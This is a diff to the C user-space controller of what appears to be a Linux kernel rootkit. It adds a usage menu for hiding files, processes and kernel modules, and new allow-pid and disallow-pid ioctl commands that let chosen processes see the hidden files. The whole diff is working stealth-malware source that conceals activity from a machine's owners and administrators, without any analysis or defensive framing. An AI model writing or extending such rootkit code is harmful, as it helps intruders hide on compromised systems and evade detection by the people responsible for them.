@@ -7,9 +7,32 @@
 
 #include "common.h"
 
+static void usage(const char *prog)
+{
+    printf("Usage: %s <command> [argument]\n", prog);
+    printf("\nCommands:\n");
+    printf("  hide-file     <filename>    Hide a file or directory\n");
+    printf("  unhide-file   <filename>    Unhide a file or directory\n");
+    printf("  hide-pid      <pid>         Hide a process by PID\n");
+    printf("  unhide-pid    <pid>         Unhide a process by PID\n");
+    printf("  hide-module   <name>        Hide any loaded kernel module by name\n");
+    printf("  unhide-module <name>        Unhide a kernel module by name\n");
+    printf("  allow-pid     <pid>         Grant process access to hidden files\n");
+    printf("  disallow-pid  <pid>         Revoke process access to hidden files\n");
+    printf("  status                      Get module status\n");
+    printf("\nExamples:\n");
+    printf("  %s hide-file secret.txt\n", prog);
+    printf("  %s hide-pid 1234\n", prog);
+    printf("  %s hide-module snd_hda_intel\n", prog);
+    printf("  %s allow-pid 1234\n", prog);
+    printf("  %s status\n", prog);
+    printf("\nNote: must be run as root (sudo)\n");
+}
+
 int main(int argc, char *argv[])
 {
     if (argc < 2) {
+        usage(argv[0]);
         return 1;
     }
 
@@ -139,7 +162,8 @@ int main(int argc, char *argv[])
 
     } else if (strcmp(argv[1], "unhide-module") == 0) {
         if (argc < 3) { 
-            fprintf(stderr, "Error: module name required\n"); close(fd);
+            fprintf(stderr, "Error: module name required\n");
+            close(fd);
             return 1;
         }
         memset(buf, 0, sizeof(buf));
@@ -154,6 +178,42 @@ int main(int argc, char *argv[])
         } else {
             printf("Module '%s' is now visible\n", argv[2]);
         }
+
+    } else if (strcmp(argv[1], "allow-pid") == 0) {
+        if (argc < 3) { 
+            fprintf(stderr, "PID required\n");
+            close(fd);
+            return 1;
+        }
+        long pid = strtol(argv[2], NULL, 10);
+        if (pid <= 0) {
+            fprintf(stderr, "Error: invalid PID '%s'\n", argv[2]);
+            close(fd);
+            return 1;
+        }
+        snprintf(buf, sizeof(buf), "%ld", pid);
+
+        ret = ioctl(fd, IOCTL_ALLOW_PID, buf);
+        if (ret == 0)
+            printf("Process %s can now see all hidden files\n", argv[2]);
+
+    } else if (strcmp(argv[1], "disallow-pid") == 0) {
+        if (argc < 3) { 
+            fprintf(stderr, "PID required\n");
+            close(fd);
+            return 1;
+        }
+        long pid = strtol(argv[2], NULL, 10);
+        if (pid <= 0) {
+            fprintf(stderr, "Error: invalid PID '%s'\n", argv[2]);
+            close(fd);
+            return 1;
+        }
+        snprintf(buf, sizeof(buf), "%ld", pid);
+
+        ret = ioctl(fd, IOCTL_DISALLOW_PID, buf);
+        if (ret == 0)
+            printf("Process %s no longer sees hidden files\n", argv[2]);
 
     } else if (strcmp(argv[1], "status") == 0) {
         char buffer[4096];
@@ -170,6 +230,7 @@ int main(int argc, char *argv[])
 
     } else {
         fprintf(stderr, "Unknown command: %s\n", argv[1]);
+        usage(argv[0]);
         close(fd);
         return 1;
     }
